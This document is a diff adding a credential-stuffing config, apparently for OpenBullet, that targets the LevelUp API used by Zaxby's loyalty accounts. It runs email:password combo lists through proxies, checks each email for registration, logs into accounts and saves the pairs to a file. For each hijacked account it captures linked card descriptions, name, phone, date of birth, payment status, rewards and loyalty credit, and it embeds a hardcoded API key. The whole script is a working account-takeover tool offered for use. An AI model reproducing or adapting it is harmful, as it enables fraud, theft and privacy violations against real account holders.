@@ -1,0 +1,181 @@
+[SETTINGS]
+{
+  "Name": "Zaxby's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-13T10:16:15.7199493+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "UUSER" 
+
+REQUEST GET "https://api.thelevelup.com/v15/registration?api_key=tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN&email=<UUSER>" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "app_name" 
+  KEYCHAIN Failure OR 
+    KEY "Email not found" 
+  KEYCHAIN Ban OR 
+    KEY "Forbidden" 
+
+UTILITY File "Zaxbys_VM.txt" AppendLines "<USER>:<PASS>" 
+
+PARSE "<SOURCE>" JSON "facebook" CreateEmpty=FALSE -> CAP "Facebook Linked" 
+
+FUNCTION GenerateGUID -> VAR "u" 
+
+FUNCTION ToUppercase "<u>" -> VAR "up" 
+
+REQUEST POST "https://api.thelevelup.com/v14/access_tokens" 
+  CONTENT "{\"access_token\":{\"api_key\":\"tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN\",\"password\":\"<PASS>\",\"device_identifier\":\"<up>\",\"username\":\"<USER>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "user_id" 
+  KEYCHAIN Ban OR 
+    KEY "Forbidden" 
+  KEYCHAIN Failure OR 
+    KEY "invalid" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "This account has either been paused or no longer exists" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+PARSE "<SOURCE>" JSON "user_id" -> VAR "user_id" 
+
+#Cards REQUEST GET "https://api.thelevelup.com/v14/credit_cards" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: token <token>" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+PARSE "<SOURCE>" JSON "" -> VAR "Cards" 
+
+PARSE "<Cards>" JSON "description" Recursive=TRUE CreateEmpty=FALSE -> CAP "CC" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Cards>" EqualTo "" 
+  KEYCHAIN Ban OR 
+    KEY "Forbidden" 
+
+#Profile REQUEST GET "https://api.thelevelup.com/v15/users" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: token <token>" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+PARSE "<SOURCE>" JSON "user.custom_attributes.preferred_location" JTokenParsing=TRUE -> VAR "loc" 
+
+PARSE "<SOURCE>" JSON "user.first_name" JTokenParsing=TRUE -> VAR "fname" 
+
+PARSE "<SOURCE>" JSON "user.last_name" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "name" "<fname> " "" 
+
+PARSE "<SOURCE>" JSON "user.phone" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "phone" 
+
+PARSE "<SOURCE>" JSON "user.born_at" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "DOB" 
+
+PARSE "<SOURCE>" JSON "user.id" JTokenParsing=TRUE -> VAR "id" 
+
+#Payment REQUEST GET "https://api.thelevelup.com/v15/payment_token" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: token <token>" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+PARSE "<SOURCE>" JSON "message" -> VAR "message" 
+
+PARSE "<SOURCE>" JSON "action" -> VAR "action" 
+
+PARSE "<SOURCE>" JSON "payment_source_available" CreateEmpty=FALSE -> CAP "payment available" 
+
+#Rewards-REQUEST REQUEST GET "https://api.thelevelup.com/v15/merchants/<id>/rewards?transfer_supported=1" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: token <token>" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+#Rewards PARSE "<SOURCE>" JSON "usable" -> VAR "usable" 
+
+#Rewards PARSE "<SOURCE>" JSON "reward.title" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "reward" "" " | Is Usable = <usable>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<payment available>" EqualTo "False" 
+
+#Loyalty-REQUEST REQUEST GET "https://api.thelevelup.com/v15/merchants/<loc>/loyalty" 
+  
+  HEADER "User-Agent: Build/7.5.0, LevelUpSDK/12.2.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: token <token>" 
+  HEADER "X-LevelUp-API-Key: tGVcsvfSsakjCiv8hQrJbzsSAHAKwHwrXJDZFHEchzyVcHTU8sj6EHZdAabHefJN" 
+
+PARSE "<SOURCE>" JSON "orders_count" CreateEmpty=FALSE -> CAP "Order count" 
+
+PARSE "<SOURCE>" JSON "potential_credit_amount" CreateEmpty=FALSE -> CAP "credit" 
+
+PARSE "<SOURCE>" JSON "merchant_loyalty_enabled" CreateEmpty=FALSE -> CAP "loyalty" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
